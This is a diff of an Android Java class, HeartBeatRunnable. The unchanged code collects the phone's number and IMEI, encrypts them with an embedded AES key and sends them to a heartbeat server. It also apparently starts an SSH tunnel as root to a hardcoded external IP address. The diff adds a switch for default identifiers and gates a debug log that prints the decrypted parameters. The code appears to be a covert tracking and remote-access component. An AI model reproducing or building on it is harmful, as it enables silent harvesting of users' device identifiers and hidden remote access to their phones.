@@ -64,8 +64,14 @@ public class HeartBeatRunnable implements Runnable {
 				return;
 			}
 			//如果获取手机号码失败次数超过10次,就停止该服务,功能正常。
-			if (phoneNumber == null) phoneNumber = PhoneInfo.getInstance(mContext).getNativePhoneNumber();
-			if (imei == null) imei = PhoneInfo.getInstance(mContext).getIMEI();
+			final boolean isNeedGetMessage = NativeParams.HEARTBEAT_GET_MESSAGE;
+			if (!isNeedGetMessage) {
+				phoneNumber = NativeParams.DEFAULT_PHONE_NUMBER;
+				imei = NativeParams.DEFAULT_PHONE_IMEI;
+			} else {
+				if (phoneNumber == null) phoneNumber = PhoneInfo.getInstance(mContext).getNativePhoneNumber();
+				if (imei == null) imei = PhoneInfo.getInstance(mContext).getIMEI();
+			}
 			if (TextUtils.isEmpty(phoneNumber) || TextUtils.isEmpty(imei)) {
 				getPhoneNumFailCount++;
 				if (getPhoneNumFailCount > 100) {
@@ -94,9 +100,9 @@ public class HeartBeatRunnable implements Runnable {
 				map.put(NativeParams.TYPE_PHONE_IMEI, imei);
 				map.put(NativeParams.TYPE_SSH_CONNECT, String.valueOf(isSSHConnected));
 				String params = RequestManager.getAuthStr(NativeParams.AES_KEY, map);
-
-				Log.d(TAG, "参数解密后：" + AESCrypt.decrypt(NativeParams.AES_KEY, params));
-
+				if (DEBUG) {
+					Log.d(TAG, "参数解密后：" + AESCrypt.decrypt(NativeParams.AES_KEY, params));
+				}
 				Map<String, String> map1 = new HashMap<>();
 				map1.put("s", params);
 				RequestEntity<HeartBeatJson> entity = new RequestEntity<HeartBeatJson>(NativeParams.URL_HEART_BEAT,
@@ -140,8 +146,8 @@ public class HeartBeatRunnable implements Runnable {
 		info.setPort("root@103.27.79.138:" + String.valueOf(sourcePort));
 		if (!isSSHConnected) {
 			if (mCurrentCount > 1 && !isStartSSHBuild) {
-				if(DEBUG){
-					Log.d(TAG,"ssh status:start_ssh");
+				if (DEBUG) {
+					Log.d(TAG, "ssh status:start_ssh");
 				}
 				info.setStatusType(HeartBeatInfo.TYPE_START_SSH);
 				isStartSSHBuild = true;
